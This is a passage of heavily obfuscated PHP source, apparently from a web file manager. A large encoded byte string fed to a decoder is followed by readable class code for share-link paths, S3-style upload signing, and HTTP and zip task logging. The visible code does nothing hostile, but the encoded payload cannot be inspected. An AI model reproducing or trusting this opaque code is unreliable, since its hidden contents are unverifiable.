c\x4b\x1c\x92\x98\xe9\xa\xd7\x6\x60\x39\x38\x3b\x11\x4\x8\xcc\xbb\x55\x2a\x14\xb8\x62\x15\xe6\x2f\xf9\x9e\x47\x8e\xd0\x7a\x26\xa0\xf4\x6a\xec\x4e\x4".strrev('@ö.ñ’ãÔC•„£a,½0Ù¹¶RÔ½EPû~ÃÎy,µQ¶÷§±GØKfIä½ È')."\x7\x6c\x99\xc4\xfe\x26\x1c\x8b\x46\xba\x52\x6a\x14\x76\xcb\xc6\xe9\x73\x2\xd\xc2\x28\x86\xfa\x0\xd\xf3\x9b\x78\xf8\x68\x95\xe6\x50\x11\x66\x8a\xab\x50\xe9\x5\x97\xc8\x85\x76\x23\x67\x32\xbf"."\x84\xd3\x1b\x1a\x1a\xfc\xd\x8d\xe8\x7f\xa6\x4\xcc\xbc\xa1\x35\x35\x34\x54\x64\x69\x68\x68\x22\xff\xd3\x4\x22\x61\x84\x79\x74\xa7\x20\x7a\xc1\x8\x1d\x64\x18\xd1\x75\x68\x10\x6c\x2c\x79\xa3\x50".strrev('ˆd5}²¾İNîØ)(/Àƒ½Óh÷!Lzãš2ÜHSGíaqŒıi¸)1o\\\\b').base64_decode('DAq0l9vIoWwC9eZT88Rm3qhIIdMrfyzABpcChc9jP0vwyy8OQCG6mwgRvKtpqIzbDw==').strrev('DsYù‚¬1†CŸAl>‰¯hãÂÛX‘š™$í%•Eo’†s`’‰ûÍ?m †!').base64_decode('GzeOHsdjZEjxGY2hYUYyBsTjyki4lJ0Ls8QtOigFEAPxYSPnMotVpaLy2M7HGVlPUg==')."\xee\x92\xb8\x22\x44\x4\x42\xfc\x79\xf\xaa\xa4\xc7\xda\xa6\xc0\x2a\xa6\x51\xe2\x1\x99\xbc\x3d\x48\xf5\x2a\x9b\x26\x57\x4c\xae\xe3\x9d\x58\x32\x47\x96\x29\x6c\x5c\x2b\x54\x63\x58\x4c\x9a\x29\x26"."\x52\x4e\x7e\x83\xf6\xa\x83\x44\x18\x80\xa\xc3\xc3\xdc\x9\xa1\x54\x81\x37\xc9\x53\x26\x44\x25\xd1\x15\x5\x0\x5e\x99\x9b\x8\xec\xab\xe4\xc6\x70\x4f\x6e\xe2\x61\x30\xcc\xbd\xaa\xca\x6e\x7\xe9"."\xa5\xb8\xa4\x88\x61\x83\xef\x77\x71\xb\xce\xea\x28\x4b\xc7\xb7\x40\xd1\x32\x87\xd0\xac\xdb\xf2\xa0\x21\x78\x77\x75\x30\xcf\x5e\x99\xb3\x4a\x26\xde\x7a\x39\x9f\xc\xc4\x57\x3\xec\x91\x50\x40\x67"."\x61\x5b\xab\x89\x37\x8a\xa5\xac\xc2\x4a\x53\x2\xba\x57\xb3\x94\x10\xe6\xaf\xf0\xc8\x40\x7c\x1c\x94\xf5\x1e\x8\xcb\xed\xae\x3\x9f\x33\xdd\x10\xde\xb2\xaf\x41\x3a\x26\x1f\x70\xe0\x41\x59\x59\x57".strrev('1§{‚¸TY!Hß{:rèB)-÷]àŒ)Ãt×¸ÍL«†Bê²¹dnË	f')."\351\162\331\13\150\12\113\267\271\131\56\346\116\173\165\343\217\131\340\174\226\13\17\53\27\100\312\362\170\74\244\252\54\134\301\53\272\203\277\231\132\5\21\335\310\126\201\125\204"."\325\300\25\64\161\122\50\305\160\355\100\310\174\350\10\151\123\71\240\17\203\25\372\220\250\122\320\271\105\263\173\122\345\2\360\26\216\211\130\60\354\321\124\56\204\353\352\361\220"."\xa8\x25\x2e\x8a\xc8\xdb\xda\x4b\x1a\xcb\x54\xbd\x94\x29\x81\xe9\xa0\x86\x36\x85\xb9\xc3\xa7\xf4\x58\x5c\x5a\x6\xa1\xdb\xbd\xa8\x5b\xfd\xe8\x1c\x20\x76\x13\x98\x90\x5e\x4a\x8d\x59\x9d\xb8\xc9\x10"."\312\260\371\121\334\273\253\264\127\50\162\105\150\327\115\145\261\134\244\137\41\315\234\117\174\251\127\111\305\326\343\354\153\334\273\53\120\176\224\307\164\370\331\21\127\217\120\131\104"."\x62\x32\x93\x98\xa2\x45\xfc\xb\x45\x53\x5d\x77\x75\x92\x67\x69\x9e\x15\x35\x83\x35\x5e\x63\x6d\x23\x2a\x57\xc4\xff\xb6\x74\x9c\xf5\x44\xbd\xa\x6a\xb8\x84\xc4\xd1\xa0\xa8\xb4\xf3\x92\x7d\xdf\x61".base64_decode('Wzdzzy0Uu0hQEOBXL97IAhsEHiUlfaAq7YNaeZ24BQWhVwYMjKWnTYtIUSSnDAUnoQ==')."\xf\xc9\xd1\x98\xc9\xa5\x47\xf8\xe2\xae\x5a\x15\xd8\xf\x8e\x44\x76\xf0\x2a\xc\xa5\x9d\x92\xec\x55\x47\x72\xf\x8e\x62\x92\xb7\x77\x89\x11\xf5\x37\x2a\x9c\x83\x55\x69\xcd\x34\x32\x4d\x4a\x20\xf9".base64_decode('qzGzHjGnZHxBxDbJ0gC/bfKwmMyeQ5E5OGaggSsgDk5wD2w5DVWLPfGKnslFyDcrig==')."\xd0\x34\xcc\x44\x9\x37\x21\x72\x8a\x8d\xdd\xb8\xf7\xb0\x59\xac\x96\x52\xe5\x53\x24\x49\x1a\xd1\x34\x77\x9c\x4\xa3\x23\x6\x9\x12\xc6\x74\xa6\x11\xe9\x6f\x9c\xee\x9f\x1\xe7\x14\xd9\xd8\x83\x1d"."\x88\x60\x1f\x41\xb\x4b\x42\x3\x7c\x46\x64\x64\xc\xf4\x9\x21\x9f\xc8\x63\x4a\x77\x76\xc4\x75\x88\x70\x92\x40\xbc\xa4\xf0\xf9\x24\xee\x54\x78\xcc\x92\x78\x9\x9d\xeb\x1a\x12\xbf\x22\x32\x59\x17"."\252\0\124\5\21\147\350\251\226\116\107\10\47\267\272\224\106\75\31\320\372\160\247\203\247\167\321\30\352\332\304\164\351\362\170\52\201\127\3\144\137\366\244\224\350\207\320\234\105"."\40\223\372\223\227\6\106\250\64\120\217\53\114\5\230\23\71\1\116\231\34\130\251\26\201\261\22\252\244\146\260\360\110\146\135\75\66\203\165\211\342\72\307\270\261\42\326\47\302"."\233\64\127\25\265\345\10\113\345\310\151\273\42\124\177\312\125\232\203\170\256\21\235\131\264\62\221\121\167\107\167\220\203\132\370\362\244\322\6\341\350\51\314\224\224\364\121\35\16"."\170\43\171\43\255\304\342\355\321\160\50\326\32\115\56\121\206\164\107\21\372\33\344\325\7\367\122\46\42\124\72\360\14\253\7\370\323\4\70\350\37\100\47\6\177\206\237\252\154"."\x71\x7e\x92\x5e\xd7\x96\xde\x6e\x72\x57\x4b\xf1\x4f\xb7\x2a\x6a\x2c\x60\x43\x95\x5c\x45\x19\x2c\x18\xae\x92\x3b\x27\xc4\xa0\x52\xe6\xa2\xa5\x57\xe6\x1f\xd3\xb1\xda\x90\xd4\x62\xa9\x40\xa9\x4a\x6b"."\x20\x7f\xf5\x2f\x90\x67\x23\xe4\xdc\x88\x11\xd2\xb\x13\x35\xde\x28\x94\xd\xdb\x10\xb\x9f\x95\x18\x93\x6b\xf\xb5\x76\x46\xbb\xd4\x50\x2c\x16\x5f\xe6\xd2\xb6\x13\x22\x71\x8b\xbf\xc9\x91\x91\x9f"."\360\220\146\106\114\2\375\172\245\377\61\360\336\44\273\112\367\210\121\350\364\311\256\350\212\354\16\10\136\30\344\276\376\151\124\172\157\247\150\151\206\255\113\0\372\62\314\124\260".base64_decode('C9FyOdfreblBKVpy76xVP6XSDzCY5PauWoZEtL0j9b9uqpERLqeMDFNA4WZ89BmAsA==').base64_decode('/MYi+2bFm0Lf+DqRT9yaqcQRD3sGzSTHIeDVKSwaV4lsWBWfQNyJNVaUry2DmSAfYg==').strrev('?§Äâ¿Òë_K;Ï{k®Î0¢$ö˜aü±ÂqèçğÚ‡gÁÄG®ì"õÀ').base64_decode('TSP3Mihnv+gcivEHPURRb0qVBqBkRci0eAalWWmgT37xxxqUBcwoWXyA+L+K5IuO6w==')."\x28\xdf\x21\x2b\x9c\x4b\x73\x43\x1\x84\xd3\x11\x47\x35\xac\x50\x65\xe6\xc7\x2a\x0\x2e\x41\x56\x8c\xb5\x8b\x2b\x9\xe2\xa7\x2a\xa\x83\xa6\x3c\x7e\x84\x20\x63\xeb\x1\xfa\x34\x1f\x95\x19\xf8\xd0".strrev('•±'."\r".'’\'¹¼C¯~â9¬¢Éø]°N­ŞÙÊ’»¡áÉI‰¤¿ÿÅ¡õß*wAÑ').strrev('qc.F³…R9ë\'ÁP”·™Ûeø>ŸĞ§§ÒÌ’“;ıØ‹0ê„VG¢<UòrT').strrev('íƒ-·=ø=7îìFÃxŠØıÎ×ì*åíRR¼2hÊÖe¼–L{2JÂ”€ …Ôè!'."\r".'')."\xb8\x5e\x91\x49\x99\x29\x6d\xc8\x47\x39\x32\x4c\xd5\x44\xac\x65\x4c\xe\xcb\x8a\xab\xa4\x17\x28\x91\x9\xf3\x32\x7c\xbe\x17\x4a\x19\xd8\x63\x70\x19\x1f\x79\xa8\x8c\x92\x3a\xef\x33\x28\xd2\x4a\xe3"."\xf4\x53\x2e\x3d\x94\x33\x7\xb4\x5c\x82\x2a\xd6\xb9\x6c\x4d\x2c\x74\x9a\xd2\xd9\x1e\xe0\xca\x46\x41\x41\xad\x58\x14\x77\x68\xf2\x96\x89\xfe\x75\xd9\xf8\x41\x5a\x4f\xaa\x43\x25\x96\xea\x2a\xbd\x95".strrev('ã£ÒmâEËñvJ¹0FKÓvv£²ªÂw¥'."\n".'»\'œé-ApĞ½(…Jân(ßn“œ'."\n".'O')."\xc1\xca\x8b\x62\xac\x32\x8\x14\x45\x7e\xbe\x1e\x2e\xf5\x3\xf2\x41\xc\x32\x28\xb\x14\x81\x1a\xae\x85\x8c\x51\x9\x71\xc3\xf4\x29\x38\x42\x29\x64\xc6\xfd\x6b\xa0\xd2\x13\x3d\xf0\xe4\x5c\xb5\x17"."\167\50\346\223\237\126\175\220\37\152\160\134\154\356\262\267\15\241\163\342\175\15\256\362\145\73\366\212\35\133\72\360\204\135\225\167\351\46\174\326\316\47\14\10\277\356\41\37\141".base64_decode('5uZ+oxj3g7MG/NxQcfTwnjr4sHoKJLyDnDIr5cPiKt316J7UayBtlQ/3ScMg9btk5Q==')."\x7c\x44\xab\xc0\xc7\x7c\xd7\x55\x7d\xfb\xcf\xf5\xac\x90\x77\x42\xab\xbc\x1e\xf8\x8d\x15\x82\x3e\x33\x39\x74\x65\xdc\x54\xaf\x69\xc1\x80\xc5\xae\x69\xbd\xd9\xc\x17\xee\xaa\x96\x2e\x4c\x60\xa8\x4b"."\320\212\15\142\105\76\63\175\306\254\171\262\160\103\114\241\270\353\144\216\335\351\17\160\53\2\51\24\67\32\52\314\17\251\274\372\111\242\133\305\274\362\245\111\317\16\360\277\133"."\60\342\364\100\263\112\212\337\225\157\362\126\214\0\301\123\111\45\112\332\20\75\372\53\46\126\51\261\305\252\243\133\240\170\136\322\375\55\312\76\124\351\207\264\357\211\305\102\237"."\7\64\163\370\214\235\307\262\173\307\322\334\7\312\152\347\46\62\22\354\220\146\220\227\265\165\157\333\311\300\200\64\105\44\113\7\53\271\106\307\364\212\202\160\161\274\57\22\261"."\146\274\220\203\155\33\233\114\213\325\46\121\242\377\305\4\262\63\22\75\116\11\325\246\52\75\17\56\146\244\245\312\363\217\222\372\307\327\264\233\162\167\374\74\350\327\34\277\204".base64_decode('kJL4UHfiZIKBRIhjq7uvnupRMVFHv0+ZKFMliye9EimcaknMHS7N7CgnOPUTMz43mw==').base64_decode('JL9uR0zhhA8JslxdS1dy9SubkpGK5DVRWbX0VqCQChExEvQIFjRRYyDNDLVzC0RN0g==')."\x4d\x73\x8b\xaa\xf0\x50\x4b\xaf\xbd\x9a\x72\x58\x4c\x1\x26\xfb\x71\xe6\x34\x15\x7d\xdd\x75\xd4\x44\xf1\x56\xcf\x53\xc0\x84\x44\x79\xdf\x7\x66\x43\x44\xe8\x82\x20\x79\x92\x21\xab\xeb\x5c\xc3\x1f"."\110\163\235\163\154\357\223\211\210\333\223\235\40\243\250\367\141\131\240\215\304\116\200\176\115\332\135\305\106\52\102\135\245\274\210\110\362\135\162\244\342\211\56\173\137\354\51\312\103".strrev('tî§°)S`\\—åŒßğ;põŞ$˜³#Öÿğ-~ÿÿùÆa¥¤º•0yí±˜').strrev(' òs}ì½­«ï8»^"ÕŸ³ù†ù­KÅKõlûIË–˜mØÓ9Œ-æhesŠ[;`').base64_decode('a3+1jIIM8YNRFTymIMYPSy93G+nhKlfZRKHT7UJa4j8qsok2IDaFuWELslAanwiJbw==')."\x4\x18\x3d\xd9\x8c\x35\x5e\x64\x67\xc7\x7a\x20\xfa\xfd\x8b\x19\x71\x22\x36\xf3\x40\xa3\x64\xba\xe4\x2\x55\x50\xb3\x94\x6b\x4e\x5c\x40\x79\xb8\x61\xe\xb1\x21\x30\x9b\x4e\x57\x89\x4e\xcf\xeb\x94"."\64\223\55\217\255\113\172\137\251\331\120\131\232\323\1\271\10\326\101\167\13\264\370\273\342\15\336\207\306\33\375\236\352\370\3\235\156\134\167\75\22\111\265\101\320\2\111\140\51".base64_decode('B5NbkQsgchPsryxD8Top8kywsqqvb94oIcTDIXk8GJ3otkzCC7qhXPIjqfZKj2VXsA==').base64_decode('dxQ8JVCxSTGS6ZopdPoTF4+GSVzRs6I9nXXECAoQHR1I2kyBMtJr1XhhCk+RWJGZyA==').base64_decode('IGU+gNklSmr9AHJJCm351Q93SWyo4V6CC6tlS5uWLWXj8Gp5MWLKkhA5Db807LimSA==')."\xbc\x2a\xe0\x7d\x4d\x80\xc8\x7\xe8\x91\xdf\x75\xf2\x87\xab\x62\x19\x24\x5d\x9d\x22\xf6\x3d\xe3\x7e\x9e\x84\x24\x12\x30\x73\x2a\xa\x35\x48\x97\x7f\xee\xbb\x57\xee\x37\xbd\x82\xdc\x96\x8c\x98\x94"."\114\112\61\137\165\350\27\333\156\106\205\53\12\222\114\257\65\102\145\215\173\173\361\226\162\277\157\56\335\324\246\11\102\106\52\57\343\304\35\241\304\254\260\142\370\154\45\366\21"."\17\274\332\163\335\203\132\131\160\132\202\273\317\144\332\264\162\225\254\31\166\276\341\120\4\341\131\11\247\46\231\57\13\23\2\175\304\373\236\161\100\66\171\166\145\254\204\12\363".strrev('çÆÏ6±·Iñá] wĞ‡Ş°¤ Ö®	ô@%HæŸ6\\]Í\'İj°Äİ–¸¼©f')."\xe5\x21\xb6\x49\x7e\x17\xd4\x73\x36\xc4\xb2\x19\xc6\x76\x78\x92\x6c\xf9\x2d\x62\xf7\x5\xac\x2c\xc1\x90\x50\x40\xcf\xc5\xa4\xea\xe4\xcb\xd9\x9\xb\x24\xab\x7f\x44\x60\xa5\x7b\x88\x25\x2b\x77\x91"."\xc0\x76\x48\xd3\x35\xf8\x12\x89\xe4\x1d\x83\x9c\x9\x39\xd1\xd5\x1c\xef\xd4\x92\x63\x8d\x40\x5f\xa\xcc\x13\xc1\x30\x4d\xb\xb9\x93\x68\x7e\xdd\xd3\x7a\xb9\x80\xb7\x67\xb4\x84\x3d\x62\x38\xe9\xac"."\x74\xd6\xaa\x4c\xac\x84\x5b\x15\x83\xa\x1f\xaa\xde\x5e\x6f\xab\xd8\x98\x7a\x4f\xa0\xa2\x92\x8a\xf6\x48\x1a\x1e\x29\xb3\x4a\x19\xda\xa2\xaa\xc5\x68\x12\x2e\x29\x78\x5e\x57\xd9\x9\x86\x0\x97\xa5"."\111\270\154\105\62\53\54\11\154\244\162\216\126\262\47\350\136\345\340\201\24\43\123\245\303\236\263\76\315\72\321\170\126\315\134\371\71\300\70\157\156\42\366\250\336\12\41\255\360".base64_decode('3LRXa0XVzBO2QuT27ALVaC1LqUJdKeWYUPtEaGRUknmRVkU/hH4Sb+GyK6sqybKySQ==').strrev('ñbY¨FJ[äÁpÂ¥ÿ"âŸÃS…†3š4èŒ€_0*ÀÜyp<Dõ»`ÊUD”uu')."\345\35\347\212\332\334\150\134\50\111\316\145\253\132\5\370\260\354\240\362\224\236\323\330\125\203\144\116\101\217\125\246\143\244\165\267\7\133\331\243\25\115\147\37\311\111\302\110\217".base64_decode('HFBIMlx6DFUkZQQEbJ8QydP6JIZG4ITL8oWyEXCTQS9Bw/iynV9/Ee+rdNulyUnTcg==')."\x7c\x38\x2d\x65\x16\xc9\x6f\x8b\xe9\x38\x42\x29\x80\x8a\xe\x8\xaf\x88\xf7\x4e\x9f\xa4\xf3\x82\x42\xe2\xae\xb\x37\x8a\x5c\xa2\x10\xb4\x25\xd4\x87\x4\xe1\x3a\x16\x9f\xc9\x93\x3a\x4d\x25\x34\xcb"._kodDe('K7QIJooVL4BiIGNJzk/l/g8t8wLzlouAvykHCroE4CrKio0HEv+flZO0n482yxGNNAU=').strrev('KêV‰âË“%êH¬•2Pé­‘:9ÔEpˆW_¶šâ–_N*ä8º°-x¤ü÷„')."\275\42\231\224\222\64\242\52\222\272\73\342\135\23\245\105\72\103\321\130\105\32\126\236\352\122\205\103\62\232\24\355\46\255\44\67\220\23\265\42\32\136\42\132\102\356\272\305\315"."\x40\x31\x6b\x32\x81\x3f\xbb\x39\x49\x6a\x39\x26\x7\x90\xcc\x74\xf5\xbc\xf0\x44\x27\xca\xb8\xc5\x1b\xf2\xbc\xda\xcc\x65\x24\xf\xb8\x9f\x29\xf2\xe8\x28\x32\x84\x85\x8a\xb0\xe2\x53\x17\xd4\x9d\x60".base64_decode('L3Zi3/J83XOeW1zeB1yX/BKcrA1CbCSck/dkAphadYBkqXLlLQdJFQOAG3acCVpzqw==')."\315\1\351\26\203\236\170\300\22\26\206\124\122\156\243\141\127\262\243\15\125\275\353\246\322\103\274\372\205\134\357\377\0\327\55\63\207\201\256\0\0".""."".strrev(''), 10, -8))); goto dªÂÍ‚‡õ; D…†’·´ğÀ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ş÷ÎÃôª) { $this->pathParse = $ş÷ÎÃôª; } protected function infoParse($Ğ‰ßöÛå, $€ƒÑüú¹ = false) { $†µî‘¯¦ =& $_SERVER[‚ûòÉ˜ş]; return Action($†µî‘¯¦[1215])->sharePathInfo($this->pathParse[$†µî‘¯¦[94]], !0, $€ƒÑüú¹); } public function listPath($’òà¢ë , $ÏÖÄ¼Ú¡ = false) { $¨‹âÛÔ“ =& $_SERVER[‚ûòÉ˜ş]; $×¼ş¤óã = IO::listPath($’òà¢ë , $ÏÖÄ¼Ú¡); if (!$×¼ş¤óã) { return $×¼ş¤óã; } if (is_array($×¼ş¤óã[$¨‹âÛÔ“[1381]])) { $ì“æ¤Ò× = Action($¨‹âÛÔ“[1390])->parsePathChildren($×¼ş¤óã[$¨‹âÛÔ“[1381]], array($¨‹âÛÔ“[471] => $’òà¢ë )); $×¼ş¤óã[$¨‹âÛÔ“[1381]] = Action($¨‹âÛÔ“[1215])->shareItemInfo($ì“æ¤Ò×); } foreach ($×¼ş¤óã as $å±Áï => $Ú¢ŸâİÊ) { if (!in_array($å±Áï, array($¨‹âÛÔ“[93], $¨‹âÛÔ“[92]))) { continue; } foreach ($Ú¢ŸâİÊ as $’Âú½‹Ä => $ì“æ¤Ò×) { $ì“æ¤Ò× = Action($¨‹âÛÔ“[1390])->parsePathChildren($ì“æ¤Ò×, array($¨‹âÛÔ“[471] => $’òà¢ë )); $×¼ş¤óã[$å±Áï][$’Âú½‹Ä] = Action($¨‹âÛÔ“[1215])->shareItemInfo($ì“æ¤Ò×); } } return $×¼ş¤óã; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($êò§Ğ¼ø) { parent::__construct($êò§Ğ¼ø); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Òı™ïŞ) { parent::__construct($Òı™ïŞ); $this->signatureVersion($_SERVER[‚ûòÉ˜ş][241]); } public function uploadFormData($Á¶ÇŸóç, $Î¬û²æå = 3600) { $Ø‰¡°Ë =& $_SERVER[‚ûòÉ˜ş]; $€É²ï‘ê = $Ø‰¡°Ë[223]; $»Åó°óÍ = $Ø‰¡°Ë[262]; $‘ºâšõ¹ = $Ø‰¡°Ë[72]; $û÷£“èŞ = gmdate($Ø‰¡°Ë[263]); $òÂËÅ’¶ = gmdate($Ø‰¡°Ë[264]); $É¤–Ñ¬‡ = $Ø‰¡°Ë[265]; $¿ÁáÄŒÎ = $Î¬û²æå . $Ø‰¡°Ë[12]; $™×¢©¸‡ = $Ø‰¡°Ë[266]; $ä…˜üá = array($this->accessKey, $òÂËÅ’¶, $this->region, $‘ºâšõ¹, $É¤–Ñ¬‡); $İ÷ÛçÜ» = implode($Ø‰¡°Ë[8], $ä…˜üá); $½é˜Ì†­ = array($Ø‰¡°Ë[267] => gmdate($Ø‰¡°Ë[1365], strtotime($Ø‰¡°Ë[269])), $Ø‰¡°Ë[270] => array(array($Ø‰¡°Ë[271] => $this->bucket), array($Ø‰¡°Ë[272] => $€É²ï‘ê), array($Ø‰¡°Ë[273], $Ø‰¡°Ë[274], $Ø‰¡°Ë[12]), array($Ø‰¡°Ë[273], $Ø‰¡°Ë[275], $Ø‰¡°Ë[12]), array($Ø‰¡°Ë[273], $Ø‰¡°Ë[276], $Ø‰¡°Ë[12]), array($Ø‰¡°Ë[277] => $™×¢©¸‡), array($Ø‰¡°Ë[278] => $İ÷ÛçÜ»), array($Ø‰¡°Ë[279] => $»Åó°óÍ), array($Ø‰¡°Ë[280] => $û÷£“èŞ), array($Ø‰¡°Ë[281] => $¿ÁáÄŒÎ))); $Éœê’¦£ = base64_encode(json_encode($½é˜Ì†­)); $…İÓëòæ = hash_hmac($Ø‰¡°Ë[282], $òÂËÅ’¶, $Ø‰¡°Ë[283] . $this->secret, !0); $å²ªÀŸö = hash_hmac($Ø‰¡°Ë[282], $this->region, $…İÓëòæ, !0); $Ì’Ó¼¤¶ = hash_hmac($Ø‰¡°Ë[282], $‘ºâšõ¹, $å²ªÀŸö, !0); $¶®‰×æó = hash_hmac($Ø‰¡°Ë[282], $É¤–Ñ¬‡, $Ì’Ó¼¤¶, !0); $éñĞ§€æ = hash_hmac($Ø‰¡°Ë[282], $Éœê’¦£, $¶®‰×æó); $çìµ– = array($Ø‰¡°Ë[240] => $Ø‰¡°Ë[12], $Ø‰¡°Ë[284] => $Ø‰¡°Ë[12], $Ø‰¡°Ë[272] => $€É²ï‘ê, $Ø‰¡°Ë[277] => $™×¢©¸‡, $Ø‰¡°Ë[285] => $Éœê’¦£, $Ø‰¡°Ë[286] => $İ÷ÛçÜ», $Ø‰¡°Ë[287] => $»Åó°óÍ, $Ø‰¡°Ë[288] => $û÷£“èŞ, $Ø‰¡°Ë[289] => $¿ÁáÄŒÎ, $Ø‰¡°Ë[290] => $éñĞ§€æ, $Ø‰¡°Ë[206] => $this->getHost()); return $çìµ–; } } goto BÆÚÅ³ª”†; F¬¹ï¤Òò: class TaskHttp extends Task { protected function startAfter() { $şæ–Î³Ğ =& $_SERVER[‚ûòÉ˜ş]; $îµ‘‹ñÌ =& $this->task; $îµ‘‹ñÌ[$şæ–Î³Ğ[1764]] = 1; Hook::bind($şæ–Î³Ğ[1732], array($this, $şæ–Î³Ğ[1765])); Hook::bind($şæ–Î³Ğ[1734], array($this, $şæ–Î³Ğ[1766])); Hook::bind($şæ–Î³Ğ[1736], array($this, $şæ–Î³Ğ[1767])); } protected function endAfter() { $ãµ´ëø“ =& $_SERVER[‚ûòÉ˜ş]; Hook::unbind($ãµ´ëø“[1732], array($this, $ãµ´ëø“[1765])); Hook::unbind($ãµ´ëø“[1734], array($this, $ãµ´ëø“[1766])); Hook::unbind($ãµ´ëø“[1736], array($this, $ãµ´ëø“[1767])); } public function progressStart($¶şÕÉ„) { $ÚÀÛîÜ“ =& $_SERVER[‚ûòÉ˜ş]; $ğÙ¨ø§ = curl_getinfo($¶şÕÉ„); self::log($ÚÀÛîÜ“[1768] . $ğÙ¨ø§[$ÚÀÛîÜ“[360]]); self::valueSet($this->task[$ÚÀÛîÜ“[451]], $this->task); } public function progressEnd($¨¾±§íè) { $—¤òÜô‘ =& $_SERVER[‚ûòÉ˜ş]; self::log($—¤òÜô‘[1769] . $this->task[$—¤òÜô‘[451]]); $this->end(); } public function progress($šİÄÓ¨², $¤‰ò¨Ãó, $Úßşæ, $ÙıŸ·½, $†ïİ™ºœ) { $Òó¼¤ =& $_SERVER[‚ûòÉ˜ş]; $î‡´Ñ±– =& $this->task; if ($†ïİ™ºœ > 0) { $î‡´Ñ±–[$Òó¼¤[826]] = $î‡´Ñ±–[$Òó¼¤[826]] == 0 ? $ÙıŸ·½ : $î‡´Ñ±–[$Òó¼¤[826]]; $î‡´Ñ±–[$Òó¼¤[1688]] = $†ïİ™ºœ; } else { if ($Úßşæ > 0) { $î‡´Ñ±–[$Òó¼¤[826]] = $î‡´Ñ±–[$Òó¼¤[826]] == 0 ? $¤‰ò¨Ãó : $î‡´Ñ±–[$Òó¼¤[826]]; $î‡´Ñ±–[$Òó¼¤[1688]] = $Úßşæ; } } $this->update(); self::log("\x70\162\x6f\147\x72\145\x73\x73\110\164\164\160\x3a\144\x6f\x77\156\x3a{$Úßşæ}\x2f{$¤‰ò¨Ãó}\73\x20\165\160\154\x6f\x61\x64\x3a{$†ïİ™ºœ}\57{$ÙıŸ·½}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($“Ûæ×”´, $æšİç¼˜ = '', $ªñÛåÍà = 0, $ìäç˜ß‹ = '') { $³Óø’Ôµ =& $_SERVER[‚ûòÉ˜ş]; $á˜ßØÄä = new Task($“Ûæ×”´, $æšİç¼˜, $ªñÛåÍà, $ìäç˜ß‹); $GLOBALS[$³Óø’Ôµ[1770] . $“Ûæ×”´] = new TaskLog($³Óø’Ôµ[1671], $á˜ßØÄä, $ìäç˜ß‹); return $á˜ßØÄä; } public function __construct($æØ¦¯‹ = '', $ô®…íİ¿ = '', $¢ù†à = '') { $›ŞôÈ ‡ =& $_SERVER[‚ûòÉ˜ş]; if (!$æØ¦¯‹) { $æØ¦¯‹ = $›ŞôÈ ‡[1671]; } $¬›Â‚Ç = $æØ¦¯‹ . $›ŞôÈ ‡[438] . rand_string(10); if (!$¢ù†à) { $¢ù†à = $æØ¦¯‹ . $›ŞôÈ ‡[63] . $¢ù†à; } switch ($æØ¦¯‹) { case $›ŞôÈ ‡[1671]: if (!$ô®…íİ¿ || !$ô®…íİ¿->task) { return echoLog($æØ¦¯‹ . $›ŞôÈ ‡[1771]); } $–§¡É‹ = $ô®…íİ¿; $¬›Â‚Ç = $–§¡É‹->task[$›ŞôÈ ‡[451]]; $æØ¦¯‹ = $–§¡É‹->task[$›ŞôÈ ‡[451]]; if (!$–§¡É‹->task[$›ŞôÈ ‡[1584]]) { $–§¡É‹->task[$›ŞôÈ ‡[1584]] = $¢ù†à ? $¢ù†à : $æØ¦¯‹; } break; case $›ŞôÈ ‡[1772]: if (!$ô®…íİ¿) { return echoLog($æØ¦¯‹ . $›ŞôÈ ‡[1773]); } $£Ú«¨–å = is_string($ô®…íİ¿) ? array($ô®…íİ¿) : $ô®…íİ¿; $–§¡É‹ = new TaskFileTransfer($¬›Â‚Ç, $æØ¦¯‹, 0, $¢ù†à ? $¢ù†à : $£Ú«¨–å[0]); foreach ($£Ú«¨–å as $ËŒµ×Éá) { $–§¡É‹->addPath($ËŒµ×Éá); } break; case $›ŞôÈ ‡[366]: if (!$ô®…íİ¿) { return echoLog($æØ¦¯‹ . $›ŞôÈ ‡[1773]); } $£Ú«¨–å = is_string($ô®…íİ¿) ? array($ô®…íİ¿) : $ô®…íİ¿; $–§¡É‹ = new TaskZip($¬›Â‚Ç, $æØ¦¯‹, 0, $¢ù†à ? $¢ù†à : $£Ú«¨–å[0]); foreach ($£Ú«¨–å as $ËŒµ×Éá) { $–§¡É‹->addPath($ËŒµ×Éá); } break; case $›ŞôÈ ‡[1255]: if (!$ô®…íİ¿) { return echoLog($æØ¦¯‹ . $›ŞôÈ ‡[1773]); } $–§¡É‹ = new TaskUnZip($¬›Â‚Ç, $æØ¦¯‹, 0, $¢ù†à ? $¢ù†à : $ô®…íİ¿); if ($ô®…íİ¿) { $–§¡É‹->addFile($ô®…íİ¿); } break; case $›ŞôÈ ‡[159]: $–§¡É‹ = new TaskHttp($¬›Â‚Ç, $æØ¦¯‹); break; default: return; break; } $this->task = $–§¡É‹; $this->taskID = $¬›Â‚Ç; Hook::bind($›ŞôÈ ‡[1708], array($this, $›ŞôÈ ‡[1774])); Hook::bind($›ŞôÈ ‡[1710], array($this, $›ŞôÈ ‡[1775])); Hook::bind($›ŞôÈ ‡[1704], array($this, $›ŞôÈ ‡[1776])); echoLog($›ŞôÈ ‡[1777] . $–§¡É‹->task[$›ŞôÈ ‡[1584]]); } public function __destruct() { $this->end(); } public function end($Ÿ¤²¬Ãš = '') { $â©•˜Œˆ =& $_SERVER[‚ûòÉ˜ş]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Ÿ¤²¬Ãš); $this->task = !1; $this->taskID = !1; Hook::unbind($â©•˜Œˆ[1708], array($this, $â©•˜Œˆ[1774])); Hook::unbind($â©•˜Œˆ[1710], array($this, $â©•˜Œˆ[1775])); Hook::unbind($â©•˜Œˆ[1704], array($this, $â©•˜Œˆ[1776])); } public function taskUpdate($‚×‡¥½¢) { $ÀêŠòúè =& $_SERVER[‚ûòÉ˜ş]; if (!$‚×‡¥½¢ || $this->taskID != $‚×‡¥½¢[$ÀêŠòúè[451]]) { return; } $ãÂËÅíí = 20; $ğú§Ëù = intval($‚×‡¥½¢[$ÀêŠòúè[1689]] * $ãÂËÅíí); $ÕëÃ›…Á = $ÀêŠòúè[173] . str_repeat($ÀêŠòúè[924], $ğú§Ëù) . $ÀêŠòúè[1055] . str_repeat($ÀêŠòúè[63], $ãÂËÅíí - $ğú§Ëù) . 